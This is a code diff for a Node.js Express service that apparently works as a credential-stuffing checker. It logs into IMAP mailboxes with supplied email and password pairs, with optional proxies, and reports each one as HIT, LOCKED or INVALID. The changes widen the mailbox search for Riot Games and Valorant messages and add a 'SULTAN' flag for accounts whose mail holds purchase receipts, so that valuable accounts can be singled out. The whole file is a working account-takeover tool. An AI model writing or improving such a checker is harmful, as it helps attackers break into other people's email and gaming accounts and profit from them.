@@ -1,6 +1,5 @@
 const express = require('express');
 const { ImapFlow } = require('imapflow');
-const { HttpsProxyAgent } = require('https-proxy-agent');
 const path = require('path');
 
 const app = express();
@@ -14,35 +13,64 @@ async function checkMail(email, password, proxy) {
         secure: true,
         auth: { user: email, pass: password },
         logger: false,
-        // Konfigurasi proxy jika ada
         ...(proxy && { proxy: proxy })
     });
 
     try {
         await client.connect();
+        
+        // 1. Cek INBOX
         let lock = await client.getMailboxLock('INBOX');
+        let resultData = { skins: 0, sultan: false, count: 0 };
+        
         try {
-            // Cari email dari Riot Games
-            let messages = await client.search({
+            // PENCARIAN KATA KUNCI MAKSIMAL
+            let searchCriteria = {
                 or: [
                     { header: { field: 'from', value: 'Riot Games' } },
-                    { body: 'Valorant' }
+                    { body: 'Valorant' },
+                    { body: 'Purchase Receipt' },
+                    { body: 'Order Confirmed' },
+                    { body: 'Riot Games Payment' },
+                    { body: 'Your Riot ID has been changed' },
+                    { body: 'Welcome to Valorant' }
+                ]
+            };
+
+            let messages = await client.search(searchCriteria);
+            resultData.count = messages.length;
+
+            // 2. DETEKSI AKUN SULTAN (Jika ada bukti pembelian)
+            let sultanMessages = await client.search({
+                or: [
+                    { body: 'Purchase Receipt' },
+                    { body: 'Order Confirmed' },
+                    { body: 'Transaction Status: Success' }
                 ]
             });
-            
-            return { 
-                status: 'HIT', 
-                count: messages.length,
-                preview: messages.length > 0 ? "Riot Found" : "No Riot Data"
-            };
+
+            if (sultanMessages.length > 0) {
+                resultData.sultan = true;
+            }
+
         } finally {
             lock.release();
         }
-    } catch (err) {
-        if (err.message.includes('AUP')) return { status: 'LOCKED', message: 'Account Locked' };
-        return { status: 'INVALID', message: 'Login Failed' };
-    } finally {
+
         await client.logout();
+        
+        return { 
+            status: 'HIT', 
+            count: resultData.count,
+            isSultan: resultData.sultan,
+            preview: resultData.sultan ? "⭐ SULTAN (Purchase Found)" : "Riot Data Found"
+        };
+
+    } catch (err) {
+        if (err.message.includes('AUP') || err.message.includes('locked')) {
+            return { status: 'LOCKED', message: 'Account Locked' };
+        }
+        return { status: 'INVALID', message: 'Login Failed' };
     }
 }
 
@@ -57,4 +85,4 @@ app.post('/api/check', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 7860;
-app.listen(PORT, () => console.log(`Mail Searcher Active on Port ${PORT}`));
+app.listen(PORT, () => console.log(`Professional Mail Searcher v1.2 Active`));
